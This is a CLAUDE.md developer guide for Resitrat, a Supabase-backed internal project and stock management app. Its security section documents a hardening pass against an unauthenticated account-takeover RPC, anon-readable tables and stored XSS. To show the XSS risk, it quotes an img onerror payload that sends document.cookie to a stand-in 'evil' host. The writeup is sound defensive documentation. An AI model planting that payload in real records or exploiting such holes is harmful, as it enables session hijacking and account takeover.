# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

**Resitrat** — sistema interno de gestão de projetos, estoque e custos. Frontend estático com HTML + Tailwind CSS (CDN), sem build step. Backend via Supabase (auth, database, RLS, RPCs).

## No Build Step

There is no package.json, bundler, or build process. Open HTML files directly in a browser or serve with any static server:

```
npx serve .
# or
python -m http.server 8080
```

No linting or test suite. Validation is done visually in the browser.

## Architecture

### Script Loading Order (required in every HTML file)

```html
<script src="js/config.js"></script>        <!-- SUPABASE_URL + SUPABASE_ANON_KEY constants -->
<script src="js/supabaseClient.js"></script> <!-- creates window._supabase -->
<script src="js/auth.js"></script>           <!-- signIn/signOut/session check; redirects on load -->
<script src="js/api.js" defer></script>      <!-- shared CRUD + fetch helpers (global scope) -->
<script src="js/[page].js" defer></script>   <!-- page-specific logic -->
```

`auth.js` runs synchronously and redirects unauthenticated users to `login.html`. It also shows/hides `#nav-cad-user` (admin-only sidebar link) based on role.

### Supabase Tables and Views

| Table/View | Used by |
|---|---|
| `projects` | api.js `fetchProjects()`, project_modal_shared.js |
| `project_summaries` (view) | dashboard.js — returns `total_tasks`, `completed_tasks`, `total_cost`, `lead_name`, `project_3d_pdf_path` |
| `tasks` | api.js `fetchTasks()`, tasks.js |
| `users` | auth.js, members.js — doubles as the member directory |
| `stock_items` | saida_estoque.js, simulacao_estoque.js |
| `stock_movements` | saida_estoque.js |
| `stock_requests` | requisicao_estoque.js — operator/admin approval flow; deferral routes to `project_items` or `stock_exits` depending on `project_id` |
| `project_items` | project_items.js, requisicao_estoque.js (deferral with project) |
| `project_forecast_items` | dashboard.js, project_forecasts.js |
| `clients` | clientes.js, dashboard_custos.js |
| `cost_entries` | dashboard_custos.js |
| `production_records` | production.js |
| `activity_log` | api.js `fetchActivityLog()` |

### Admin vs Operator Role Detection

Determined in `auth.js` / `signIn()` by checking email prefix (`ADM*`, `*ADMIN*`) or the `users.role` field for keywords: GERENTE, COORDENADOR, GESTOR, ADMIN, DIRETOR, FINANCEIRO.

After login: admins → `gerenciamentodeprojetos.html`, operators → `requisicao_estoque.html`.

The `#nav-cad-user` sidebar link is `class="hidden"` by default; `auth.js` uses `classList.remove('hidden')` / `classList.add('flex')` to reveal it for admins only.

**Importante:** o usuário deve existir tanto em `auth.users` (Supabase Auth) quanto na tabela pública `users` com um `role` reconhecido. Se o registro em `public.users` estiver ausente, `auth.js` não encontra o perfil e o usuário é tratado como operador — mesmo que a senha seja de uma conta admin. Para conceder acesso completo a um usuário existente somente em `auth.users`, insira-o em `public.users` com `role = 'COORDENADOR'` (ou outro role admin):
```sql
INSERT INTO users (id, name, email, role, status)
VALUES ('<auth_uuid>', 'NOME', 'email@resitrat.com.br', 'COORDENADOR', 'ATIVO');
```

### Gestão à Vista — Exclusive Third Role (gestao_avista.html)

A third, mutually-exclusive account type layered on top of admin/operator, both handled in `auth.js` by exact-match (lowercased) email rather than role keywords:

- **`gestaoavista@resitrat.com.br`** — dedicated kiosk/display account. `signIn()` and `checkSession()` route it straight to `gestao_avista.html` and lock it there (mirrors the operator→`requisicao_estoque.html` lock); it cannot reach any other page.
- **`adm@resitrat.com.br`** (exact match, not just any `ADM*` admin) — the only regular account allowed to open `gestao_avista.html`, and the only one for whom the `#nav-gestao-avista` sidebar link (present, `hidden` by default, on every sidebar page including `cadastro_usuario.html`) is revealed.
- Any other authenticated user hitting `gestao_avista.html` directly is redirected back to their normal home page (`checkSession()`'s `isGestaoAvistaPage && !isFullAdmin` branch).
- Create the account the same way as any other user (Supabase Auth + a matching `public.users` row); no special `role` value is required since routing is by email, not role.

### Global Behaviors in api.js

- **All text inputs are auto-uppercased** via a global `input` event listener and a CSS rule injected into `document.head`.
- `formatDate(dateStr)` is attached to `window` — formats `YYYY-MM-DD` → `DD/MM/YYYY` safely without timezone conversion.

### Shared Modal System (project_modal_shared.js)

Injects `#project-modal` and `#delete-modal` HTML into `<body>` via `insertAdjacentHTML('beforeend', ...)`. Must be loaded after the page HTML. Exposes:
- `openNewProjectModal()`, `editProject(id)`, `saveProject()`, `closeModal()`
- `openDeleteModal(id)`, `closeDeleteModal()`, `confirmDeleteProject()`
- Budget breakdown: inputs `p-budget-reservatorios`, `p-budget-filtros`, `p-budget-bombas`, `p-budget-hidraulicos`, `p-budget-eletricos`, `p-budget-dosadoras`, `p-budget-terceiros`, `p-budget-frete`, `p-budget-eletrolise`
- `calculateTotalBudget()` sums all breakdown fields into `#p-budget`
- Fires `window.dispatchEvent(new Event('project-saved'))` after successful save/delete so other scripts can refresh

## Security

Hardening pass done on 2026-07-02, in response to a request to close data-leak/attack vectors. Two independent layers were reviewed: the Supabase backend (RLS + RPCs) and the frontend (stored XSS via `innerHTML`). Findings and current state below — read this before adding new tables, RPCs, or `innerHTML` templates.

### Backend — RLS and RPC lockdown (Supabase project `dfmbyxupxirdnvnxvpwa`)

**What was found (via `mcp__claude_ai_Supabase__get_advisors` + direct `pg_policies` inspection, then confirmed with live unauthenticated `curl` calls against the REST API — never trust the advisor/metadata summary alone, verify with a real anonymous request):**

1. **Critical — unauthenticated full account takeover.** `public.admin_update_user_auth(target_user_id, new_email, new_password)` was `SECURITY DEFINER`, directly overwrote `auth.users.email` / `auth.users.encrypted_password` for **any** `target_user_id`, performed **zero caller authorization checks**, and was `GRANT`ed to the `anon` role. Anyone with the public anon key (shipped in `js/config.js`, so effectively anyone) could `POST /rest/v1/rpc/admin_update_user_auth` with no session at all and take over any account, including `adm@resitrat.com.br`.
2. **Critical — most tables were world-readable/writable with no login.** `users`, `projects`, `tasks`, `project_items`, `stock_requests`, and `activity_log` all had RLS policies granting `SELECT`/`INSERT`/`UPDATE`/`DELETE` (several via `USING (true)`) to the `public` role — which in Postgres RLS means **both `anon` and `authenticated`**, i.e. no login required. This included staff names/emails/roles (`users`), all project/financial data (`projects`, `project_items`), and stock requisitions. Verified by direct `curl` against `/rest/v1/<table>` with only the anon key — full data returned, no auth header needed.
3. Two functions (`admin_update_user_auth`, `register_stock_exit`) had a mutable `search_path`, a search-path-hijacking risk for `SECURITY DEFINER`/privileged functions.
4. Leaked-password protection (HaveIBeenPwned check) is disabled in Supabase Auth — **not fixable via SQL**, must be enabled manually in the dashboard: Authentication → Policies → Password Security.

**Fixes applied (3 migrations — `list_migrations` on this project shows them in order):**
- `lockdown_admin_update_user_auth_rpc` — added an internal authorization check to `admin_update_user_auth` that mirrors the app's own admin-role model (email prefix `ADM*`/`*ADMIN*`, or `public.users.role` containing GERENTE/COORDENADOR/GESTOR/ADMIN/DIRETOR/FINANCEIRO — same list as `auth.js`), pinned `search_path = public, extensions, pg_temp` (pgcrypto's `crypt`/`gen_salt` live in `extensions`), revoked `EXECUTE` from `anon`/`PUBLIC`, kept it granted to `authenticated` (now safe, since the function self-checks the caller). Also pinned `register_stock_exit`'s search_path.
- `restrict_public_rls_policies_to_authenticated` — changed every policy that targeted the `public` role to `authenticated` (via `ALTER POLICY ... TO authenticated`, so `USING`/`WITH CHECK` clauses were **not** touched — behavior for logged-in users is unchanged, only anonymous access was removed) across `activity_log`, `project_items`, `projects`, `stock_requests`, `tasks`, `users`.
- `restrict_remaining_tasks_read_policy` — a follow-up fix for one policy (`tasks` → `"Enable read access for all users"`) that was missed in the first pass and only caught by re-verifying with a live anonymous `curl` call after the first migration returned actual task data. **Lesson: after any RLS change, re-query `pg_policies` filtered on `roles::text like '%public%'` (or `%anon%`) and hit the REST API directly with just the anon key — don't trust a manual read of the advisor/policy dump, it's easy to miss one row in a long list.**

**Post-fix verified state:** zero RLS policies in `public` schema grant anything to `public`/`anon` (confirmed by direct filtered SQL query, not just the advisor). Live anon `curl` against `users`, `projects`, `project_items`, `stock_requests`, `activity_log`, `tasks`, `clients`, `stock_exits`, `stock_items` all return `[]`. Anon call to `admin_update_user_auth` returns `401 permission denied for function`.

**Known remaining (accepted) risk — not changed, needs a product decision before touching:** `clients`, `stock_exits`, `stock_items`, `production_orders`, `production_logs`, `project_forecast_items`, and now also the tables fixed above, all still grant **full unrestricted CRUD to any `authenticated` user** (`USING (true)`) — there is no DB-level distinction between admin and operator; that split is enforced only client-side in `auth.js`. This was already the pre-existing, intentional-looking design for half the tables (`clients`, `stock_exits`, etc.) before this pass, so extending it to the other tables (rather than inventing a new per-table model) was the lowest-risk fix that closed the actual reported vulnerability (unauthenticated access) without risking breaking legitimate operator flows. Moving to real per-role DB policies (e.g. a `is_admin()` helper checking `public.users.role`) is a larger, separate change — flag it back to the user before attempting it, since it touches every write path in the app (`requisicao_estoque.js`, `saida_estoque.js`, etc.) and needs careful testing against both roles.

**Also unresolved (needs the user, not a migration):** enable leaked-password protection in the Supabase Auth dashboard (see link above).

### Frontend — stored XSS via `innerHTML`

Every `name`/`title`/`observation`/`description`/`email`/`reason`/etc. field in this app is free-text set by an authenticated user (operator or admin) and, in ~17 of the 23 page-JS files, was interpolated directly into `innerHTML` template strings with no escaping — e.g. a project or client named `<img src=x onerror=fetch('//evil/'+document.cookie)>` would execute in the browser of the next person (often an admin) who viewed that record. After the RLS fix above this requires an authenticated attacker, but the operator role is exactly that: authenticated but lower-privilege, and the payoff (hijacking an admin's session) is high.

- **`escapeHtml(value)`** was added to `js/api.js` (alongside `formatDate`, same `window.*` global-exposure pattern) and is now the standard way to sanitize any user-controlled string before it goes into an `innerHTML` template. Use it for every interpolated field that came from the database and isn't a number, a known-enum/status string rendered through a fixed badge function, or already going through `.textContent` (which is safe by construction — don't wrap those, `escapeHtml` there would show literal `&amp;` to users).
- Applied across `gestao_avista.js`, `requisicao_estoque.js`, `dashboard.js`, `saida_estoque.js`, `dashboard_custos.js`, `clientes.js`, `tasks.js`, `members.js`, `cadastro_usuario.js`, `projects.js`, `project_items.js`, `project_forecasts.js`, `montecarlo.js`, `simulacao_estoque.js`, `production.js`, `reports.js`, and the orphaned/unused `estoque.js`. Covers table rows, badges, modal summaries, toast/banner text, and — a less obvious sink — values injected into HTML **attributes** like `value="${...}"` or `title="${...}"` (montecarlo.js / simulacao_estoque.js product-name inputs), where an unescaped `"` breaks out of the attribute, not just `<script>` tags in text content.
- **When adding a new render function:** any `${someField}` inside a string assigned to `.innerHTML` (or returned from a helper that ends up in one) needs `escapeHtml()` if `someField` isn't a number/date/fixed-enum. `.textContent =` assignments never need it.
- Verified with a Playwright smoke test across 8 representative pages (dashboard, requisicao_estoque, saida_estoque, dashboard_custos, listaprojetos, tarefas, membros, gestao_avista) after all edits — zero console errors, pages render normally.

## UI Conventions

### Brand Colors (Resitrat)

| Name | Light | Dark |
|---|---|---|
| Primary | `#135bec` | — |
| Navy gradient | `#1e3a8a → #2563eb` | — |
| Green gradient | `#14532d → #16a34a` | — |
| Ocean gradient | `#0c4a6e → #0ea5e9` | — |
| Crimson gradient | `#7f1d1d → #dc2626` | — |
| Amber | `#92400e → #d97706` | — |
| Background light | `#f0f2f8` | `#101622` |

### Sidebar Pattern (w-52)

All pages share an identical sidebar structure. Active page item:
```html
<a class="flex items-center gap-2 rounded-lg bg-primary/10 px-2 py-1.5 text-primary" href="PAGE.html">
  <span class="material-symbols-outlined fill-1" style="font-size:18px">ICON</span>
  <p class="text-xs font-medium">LABEL</p>
</a>
```
Inactive item:
```html
<a class="flex items-center gap-2 rounded-lg px-2 py-1.5 text-text-light-secondary dark:text-text-dark-secondary hover:bg-primary/10 dark:hover:bg-primary/20 hover:text-primary transition-colors" href="PAGE.html">
  <span class="material-symbols-outlined" style="font-size:18px">ICON</span>
  <p class="text-xs font-medium">LABEL</p>
</a>
```

Bottom section (Ajuda/Configurações/Sair) uses `p-3 border-t` with same item pattern.

### Tailwind Config (in every HTML file)

```js
tailwind.config = {
  darkMode: "class",
  theme: {
    extend: {
      colors: {
        primary: "#135bec",
        text: {
          light: { primary: "#0d121b", secondary: "#526071", tertiary: "#8292a2" },
          dark: { primary: "#ffffff", secondary: "#9ca3af", tertiary: "#6b7280" }
        },
        background: { light: "#f0f2f8", dark: "#101622" }
      },
      fontFamily: { sans: ["Inter", "sans-serif"] }
    }
  }
};
```

Font import: `Inter:wght@300;400;500;600;700;800`

### KPI Cards with Brand Gradients

Gradient icon backgrounds are inline `style=` because Tailwind CDN can't purge dynamic class names:
```html
<div style="background:linear-gradient(135deg,#1e3a8a 0%,#2563eb 100%)" class="w-11 h-11 rounded-xl flex items-center justify-center">
  <span class="material-symbols-outlined text-white" style="font-size:20px">ICON</span>
</div>
```

### Toast Notifications

`dashboard_custos.js` and `requisicao_estoque.js` use a toast system (not `alert()`):
```js
showToast(message, type, duration)  // type: 'success'|'error'|'warning'|'info'
```
Requires `<div id="toast-container" class="fixed top-4 right-4 z-[100] flex flex-col gap-2 pointer-events-none"></div>` in the HTML.

## Page → JS Map

| HTML | JS file(s) | Notes |
|---|---|---|
| `gerenciamentodeprojetos.html` | `dashboard.js`, `project_modal_shared.js` | Main dashboard; uses `project_summaries` view |
| `listaprojetos.html` | `projects.js`, `project_modal_shared.js` | Project list/kanban |
| `itens_projeto.html` | `project_items.js` | Items per project; imports xlsx + pdfjs |
| `controle_producao.html` | `production.js` | Kanban board |
| `saida_estoque.html` | `saida_estoque.js`, `api.js` | Stock exit; exports xlsx/pdf |
| `requisicao_estoque.html` | `requisicao_estoque.js`, `api.js` | Operator/admin roles; duplicate detection; deferral routes to project_items or stock_exits; history edit/delete |
| `simulacao_estoque.html` | `simulacao_estoque.js` | Purchase forecast — **não aparece no menu lateral**; acesso direto via URL |
| `clientes.html` | `clientes.js`, `api.js` | Client CRUD |
| `dashboard_custos.html` | `dashboard_custos.js` | Cost analysis per client; Chart.js |
| `tarefas.html` | `tasks.js`, `api.js` | Task board by project; live search + status filter chips, collapsible project sections (see "Tarefas Board" under Key Patterns) |
| `membros.html` | `members.js`, `api.js` | Team management |
| `relatorios.html` | `reports.js` | Reports |
| `previsao_projeto.html` | `project_forecasts.js` | Forecast per project (sub-page) |
| `cadastro_usuario.html` | `cadastro_usuario.js` | Admin-only user registration |
| `configuracoes.html` | `settings.js` | Settings |
| `montecarlo.html` | `montecarlo.js` | Monte Carlo stock forecast — chemical/hydraulic materials; reached from relatorios.html |
| `gestao_avista.html` | `gestao_avista.js` | Kiosk/TV dashboard — no sidebar; auto-rotates every 15s through whichever project-status slides currently have data, plus Projetos 3D and current-month cost per client; refetches data every 60s. Exclusive to `adm@resitrat.com.br` and `gestaoavista@resitrat.com.br` (see "Gestão à Vista — Exclusive Third Role" above). See "Gestão à Vista — Etapas per Project Card", "Gestão à Vista — Slide Validation" and "Gestão à Vista — Projetos 3D Slide" under Key Patterns |
| `login.html` | `auth.js` (defer) | No sidebar; split-panel layout |

## Login Page Design

Split-panel layout: brand panel (left, hidden on mobile) + form panel (right).

**Brand panel** (`lg:w-[52%]`, navy gradient `#0b1641 → #1e3a8a → #1d4ed8`):
- Logo inverted to white (`brightness-0 invert`)
- 3 feature cards with `rgba(255,255,255,0.06)` glass background
- Decorative `circle-deco` CSS circles (white, `opacity:0.08`) for depth
- Copyright at the bottom

**Form panel** (flex-1, `bg-[#f0f2f8]`):
- Brand icon button (lock icon, navy gradient) as visual anchor
- Custom `.input-field` class (border-radius 10px, left-icon padding 42px, focus ring `rgba(37,99,235,0.12)`)
- Password show/hide toggle (`#toggle-password`, `visibility` / `visibility_off` icons)
- `.btn-primary` gradient button with spinner (`#btn-spinner`) and disabled state during submit
- `#error-banner` (hidden by default, red-50 bg) replaces `alert()` for auth errors — shown by `showError(msg)`, cleared on any input change
- Loading state: `setLoading(true)` disables button + shows spinner before `signIn()` call

**auth.js integration**: the form calls `await signIn(email, password)` from `auth.js`. If `signIn` throws, the catch block calls `showError()`. On success, `auth.js` handles the redirect (admins → `gerenciamentodeprojetos.html`, operators → `requisicao_estoque.html`).

## Monte Carlo Stock Forecast (montecarlo.html / montecarlo.js)

**Purpose:** Probabilistic forecasting of chemical-product and hydraulic-material consumption to dimension minimum stock levels and generate purchase recommendations.

**Input table columns:** Product name · Unit (dropdown: un/kg/L/g/m/m²/m³/pç/cx/rolo/lt/sc) · Consumption Min/Month · Consumption Likely/Month · Consumption Max/Month (Triangular distribution) · Lead Time Min (days) · Lead Time Max (days) · Current Stock.

**Import:** "Importar do Estoque" button fetches `stock_items` via `_supabase.from('stock_items')` and pre-fills name/unit/current stock; user fills in consumption estimates.

**Algorithm (10,000 iterations per product):**
- Total period consumption → sum of H monthly `triangularSample(min, likely, max)` calls
- Lead-time demand → `uniformSample(ltMin, ltMax)` days converted to months, then triangular samples
- **Safety Stock** = P_conf(lead-time demand) − P50(lead-time demand)
- **ROP** (Reorder Point) = P50(lead-time demand) + Safety Stock
- **Suggested Purchase** = max(0, P_conf(period) + SafetyStock − currentStock)
- **Coverage days** = currentStock / (P50 / horizonMonths / 30)
- **Status**: CRÍTICO if stock ≤ safetyStock; ATENÇÃO if stock ≤ ROP; OK otherwise

**Output:**
- 4 KPI cards: total products · critical · attention · average coverage days
- Results table sorted by priority (critical first); clickable rows update the histogram
- Histogram (Chart.js bar) showing period-consumption distribution with P50 (blue) and P_conf (green) lines
- Horizontal bar chart with coverage days per product, color-coded by status

**Config params:** Horizon (1/3/6/12 months) and Confidence level (P80/P90/P95) — selected before running.

**Toast notifications** replace all `alert()` calls. Requires `#toast-container` in HTML.

## Key Patterns

### Duplicate Request Detection (requisicao_estoque.js)

When an operator submits a stock request, the system checks `allRequests` array for entries with same `item_name` (uppercase) + `requested_by` (uppercase) + `status === 'PENDENTE'`. Shows amber warning banner (`#duplicate-warning`) with a confirmation checkbox (`#confirm-duplicate`). Submission is blocked unless checkbox is checked.

### Dashboard Table Refresh

`dashboard.js` uses `currentRenderId` (integer) to cancel stale renders when filters change mid-load:
```js
currentRenderId++;
const thisRenderId = currentRenderId;
for (const project of projects) {
    if (thisRenderId !== currentRenderId) return; // abort if superseded
    // ... append row
}
```

### Cost Analysis — Over-Budget Tipping Point (dashboard_custos.js)

To explain WHY a client exceeded budget, the code runs a cumulative sum over cost items sorted by date and marks:
- First item that pushes total over budget → badge "Estourou aqui"
- All subsequent items → badge "Excesso"

### Role Switching (requisicao_estoque.js)

The page has a dual operator/admin view toggled via `switchRole(role)`. The `#nav-cad-user` element in the sidebar also becomes `flex` (visible) for admins via this function.

### Stock Request Approval Routing (requisicao_estoque.js)

The destination is driven by `req.reason` (the "Aplicação / Motivo" field), not by which ID happens to be set. In the request form, `#req-project-wrapper` is shown/required only when reason is "Industrialização"; otherwise `#req-client-wrapper` is shown/required (toggled by `updateReqDestinationFields()`, triggered on `#req-reason` change). Only one of `project_id` / `client_id` is populated per request.

When an admin accepts a requisition (`approve-form` submit, button labeled **Aceitar**):

- **`reason === 'Industrialização'`** → `createProjectItem()` inserts directly into `project_items` (name, quantity, unit, value = unit price, category = reason, nota_fiscal = null). `stock_exits` is **not** written.
- **Any other reason** (e.g. "Serviço") → `ensureStockItem()` + `processStockExit()` flow, recording into `stock_exits` and attributing cost to `req.client_id`.

The approve modal button label and hint text update dynamically in `openApproveModal()` to reflect the destination. Rejecting (button labeled **Rejeitar**) sets status `INDEFERIDO` — the underlying status values `DEFERIDO`/`INDEFERIDO` are unchanged; only display labels became "Aceito"/"Rejeitado".

**Devolução (return):** `confirmReturnRequest()` mirrors the same split by `reason === 'Industrialização'` — finds the matching `project_items` row by name+project and decrements/deletes it; otherwise it falls back to `stock_exits`.

### History Edit / Delete (requisicao_estoque.js)

Admin "Histórico Consolidado" tab exposes per-row **Editar** and **Apagar** actions alongside the existing Devolver button.

- **`openHistoryEditModal(req)`** — opens `#history-edit-modal` with editable fields: item name, quantity, unit, unit_price (DEFERIDO only), observation, and the **Aplicação/Motivo** (`#hist-edit-reason-select`), which toggles `#hist-edit-project-wrapper` / `#hist-edit-client-wrapper` via `updateHistEditDestinationFields()` exactly like the new-request form. Hidden inputs `hist-edit-status`, `hist-edit-orig-project-id`, `hist-edit-orig-client-id`, `hist-edit-orig-name`, `hist-edit-orig-reason` retain the pre-edit values for lookup/comparison.
- **`saveHistoryEdit()`** — updates `stock_requests` (including the new `reason`/`project_id`/`client_id`). For DEFERIDO requests, if the edited Aplicação changes which destination type applies (or the selected project/client itself changes), it **reallocates**: deletes the old `project_items`/`stock_exits` row (matched via the `orig-*` hidden fields) and creates a new one at the new destination via `createProjectItem()` or `ensureStockItem()`+`processStockExit()`. If the destination is unchanged, it just updates the existing row in place (name/qty/unit/value).
- **`deleteHistoryRecord(req)`** — cascade deletes: removes the linked `project_item` or `stock_exit` (if DEFERIDO, routed by `req.reason === 'Industrialização'`), then deletes the `stock_requests` row.

### Gestão à Vista — Etapas per Project Card (gestao_avista.js)

Each project card (Em Andamento / Em Espera / Concluídos slides) shows a compact "Etapas" list pulled straight from `tasks` (grouped by `project_id` into `tasksByProject` inside `loadData()`) — there's no separate stages/etapas table in the schema; the project's tasks *are* its stages.

- **Order is always status-first and must never be broken**: In Progress leads, To Do in the middle, Done trails last (`TASK_STATUS_ORDER`), then by `due_date` within each group (`statusThenDueDate`). Nothing — including highlighting the longest stage — is allowed to reorder a task ahead of its status group.
- **Duration per task** (`taskDurationMs`): from `created_at` until now for open tasks, or until `due_date` for Done tasks — `tasks` has no `completed_at` column (only `projects` does, set by `checkProjectCompletion()`), so `due_date` is the accepted fallback completion timestamp, same approximation `reports.js` already used.
- **Longest-running stage** is flagged (amber text + timer icon via `isLongest`) and, if the 4-item visible cap (`ETAPAS_MAX_VISIBLE`) would cut it off, it's spliced back into its correct sorted position with `statusThenDueDate` — never pinned to the front, since that previously broke the status-order rule above (a long-finished Done task could jump ahead of an active In Progress one).

### Gestão à Vista — Backend-Filtered Data Loading (gestao_avista.js, api.js)

`loadData()` scopes every query to what the kiosk actually displays instead of fetching whole tables and filtering in JS (this used to be the main cause of slow loads, worsening as the tables grew):

- `fetchProjectSummariesByStatus(RELEVANT_PROJECT_STATUSES)` — `.in('status', ...)` server-side instead of `fetchProjectSummaries()` + client-side `.filter()`. `RELEVANT_PROJECT_STATUSES` covers every status the kiosk can show (current + legacy Portuguese values); anything else (e.g. a future Cancelled status) is excluded by the query itself.
- `fetchTasksByProjectIds(allProjects.map(p => p.id))` — `.in('project_id', ...)` instead of `fetchTasks()`'s full-table select, since tasks are only ever needed for the projects just fetched.
- `fetchStockExitsForDateRange(startISO, endISO)` (`currentMonthRange()` computes the `[start of month, start of next month)` bounds) — instead of `fetchStockExits()`'s unbounded select of the entire, ever-growing exit history, when the cost slide (`renderCostSlide()`) only ever shows the current month.

None of these three new functions replaced the original unfiltered versions in `api.js` — `dashboard.js`, `reports.js`, `tasks.js`, `dashboard_custos.js`, `saida_estoque.js`, and `simulacao_estoque.js` still need the full, unfiltered data and keep calling `fetchProjectSummaries()`/`fetchTasks()`/`fetchStockExits()` as before.

### Gestão à Vista — Slide Validation (gestao_avista.js)

The kiosk only rotates through slides that currently have data. `computeActiveSlides()` checks `allProjects` for at least one project in each status (Em Andamento / Em Espera / Concluído) before including that slide — e.g. "Em Espera" is skipped entirely from the rotation if there are zero on-hold projects. The Custo do Mês slide isn't project-status-based, so it always stays in rotation (it has its own "sem saídas este mês" empty state).

- `activeSlides` (recomputed on every load/refresh) replaces the old fixed 4-item `SLIDES` list everywhere: `goToSlide`, `autoScrollActiveSlide`'s scroll target, and the footer dots.
- Footer dots are no longer 4 static `<span>`s in the HTML — `#slide-dots` is an empty container rebuilt by `renderDots()` to match `activeSlides.length`.
- On the 60s periodic refresh, if the slide currently on screen no longer qualifies (e.g. its last on-hold project just got marked Concluído), the kiosk jumps to the first valid slide; otherwise it keeps showing the same slide uninterrupted rather than restarting the carousel.

### Gestão à Vista — Projetos 3D Slide (gestao_avista.js, project_modal_shared.js)

A 5th slide (`slide-3d`, right after Em Andamento) shows projects that have a 3D design PDF attached. This is a cross-cutting attachment, not a status bucket — `projects.project_3d_pdf_path` (nullable `text`, storage object path) is set from the **Projeto 3D (PDF)** file input in the shared project modal (`project_modal_shared.js`), not a checkbox/category field. `project_summaries` (view) exposes this column alongside its existing fields.

- **Storage**: PDFs live in the private Supabase Storage bucket `project-3d-pdfs` (RLS: `authenticated`-only SELECT/INSERT/UPDATE/DELETE, no `anon` access — unlike the pre-existing `avatars` bucket, which still grants `anon` read/write and was left alone since fixing it wasn't part of the request that led to this feature; flag it back to the user before touching it). Object paths are random (`${crypto.randomUUID()}.pdf`), not derived from project id/name.
- **Upload/replace/remove** (`project_modal_shared.js`): `uploadProject3dPdf()`, `deleteProject3dPdf()`, `getProject3dPdfSignedUrl()` wrap the bucket. `saveProject()` only touches storage if a new file was chosen or `remove3dPdf()` was clicked (`remove3dPdfRequested` flag) — replacing a file deletes the old object after the new upload succeeds; editing the modal without touching the file input leaves `existing3dPdfPath` untouched.
- **Kiosk display renders the PDF's first page as an image directly on the card** (no click required — this was a deliberate correction from an earlier click-through-link version). `gestao_avista.html` loads `pdf.js` (`pdfjsLib`, same CDN build `itens_projeto.html` already uses for text extraction, here used for rendering instead). `renderPdfFirstPageToImage()` in `gestao_avista.js` fetches/renders page 1 via `pdfjsLib.getDocument(url).getPage(1).render(...)` onto a canvas and converts it to a `image/png` data URL with `canvas.toDataURL()`. Results are cached in `threeDPreviewCache` keyed by storage path so an unchanged attachment isn't re-rendered every 60s refresh — only new/changed PDFs pay the render cost.
- **Render scale is sized to the display, not fixed**: these are engineering design PDFs and frequently large-format (A1/A0). Rendering at a flat multiplier (the original implementation used 1.5x unconditionally) produced canvases several thousand pixels wide for those pages — expensive to rasterize and PNG-encode on the main thread, and the actual cause of a reported slowdown in the 3D slide. `renderPdfFirstPageToImage()` instead reads the page's real unscaled width (`page.getViewport({ scale: 1 }).width`) and computes `scale = min(2, THREE_D_PREVIEW_TARGET_WIDTH / unscaledWidth)` (`THREE_D_PREVIEW_TARGET_WIDTH = 640`), so a huge drawing gets downscaled to kiosk-tile size and a small one is capped at 2x rather than blown up.
- **Non-blocking, progressive load**: `loadData()` calls `loadThreeDPreviewsAndRender()` without awaiting it, so it can't block the other slides (including Em Andamento) the way it originally did. Within that function, previews render progressively — each PDF patches into `threeDPreviewByProject` and triggers `renderThreeDSlide()` + `refreshActiveSlides()` as soon as it's ready, instead of waiting for every 3D project in the kiosk to finish before showing any of them. Signed URLs for every project needing a fresh render are requested in one batched `createSignedUrls()` call rather than one round trip per project, and the renders themselves run through a small worker pool (`THREE_D_RENDER_CONCURRENCY = 3`) — canvas rendering is synchronous main-thread work, so unbounded concurrency doesn't render anything faster, it just makes the tab less responsive while every PDF fights for the same thread at once. `isVisible3d(p)` (slide membership) only depends on `project_3d_pdf_path` being set, not on the preview image being rendered yet, so `threeDCardHtml()`'s placeholder-icon fallback (see below) can briefly show for previews still in the pending queue.
- `isVisible3d(p)` gates the slide the same way the other three do: only projects that are effectively in-progress/on-hold/completed (never cancelled) with a `project_3d_pdf_path` show up, and `computeActiveSlides()` skips the whole slide if none currently qualify.
- **Cards are deliberately minimal** — just the project name and the rendered design, unlike every other slide's status/etapas/meta-custo card (`threeDCardHtml()`). The image fills the space above the name via `flex-1 min-h-0` + `object-contain` (scales proportionally, never cropped/stretched/blurred), falling back to a placeholder icon if the preview hasn't rendered yet. Sorted alphabetically by name (no status grouping, since status isn't shown).
- **Layout adapts to how many 3D projects currently qualify** (`THREE_D_LAYOUTS`, 1–6 tiles): the grid's `grid-template-columns`/`-rows` are set inline (beats the element's responsive `grid-cols-*` utility classes at every breakpoint) so each tile stretches to fill an equal share of the whole slide with no scrolling — 1 project fills the entire slide, 2 fills it split in half, etc. Past 6 (not in the lookup table) tiles would shrink past readability, so it falls back to the fixed-size (`h-64`/`lg:h-72`) scrollable tile grid the other slides use, relying on the existing `autoScrollActiveSlide()` to scroll through the overflow.

### Tarefas Board — Search, Filters, Collapsible Sections (tasks.js)

`renderBoard()` rebuilds the whole `#tasks-container` from `currentTasks`/`projects` on every keystroke or filter change (no incremental diffing — cheap enough at this board's scale).

- Search (`#task-search`) matches task title, project name, or assignee name (case-insensitive substring), combined with the status chips (`#status-filter-chips`, `data-status="all|To Do|In Progress|Done"`). A project section is hidden entirely once filtering leaves it with zero matching tasks.
- Matched text is highlighted via `highlightMatch()`, which finds the match index in the **raw** title and escapes the three slices (before/match/after) individually — escaping the whole string first and searching in the escaped version would misalign indices whenever the title contains `&`, `<`, `>`, `"`, or `'` before the match.
- Project sections are collapsible (`collapsedProjects` Set keyed by project id; toggled via the `data-collapsed` attribute on `.project-section` + matching CSS in `tarefas.html`).
- Avatars (header team stack and per-card assignee) go through `renderAvatar()`: real photo if `avatar_url` is set, otherwise colored initials (`avatarColor()` hashes the name into a fixed palette) — replaces the previous behavior of a broken `background-image` when `avatar_url` was empty.
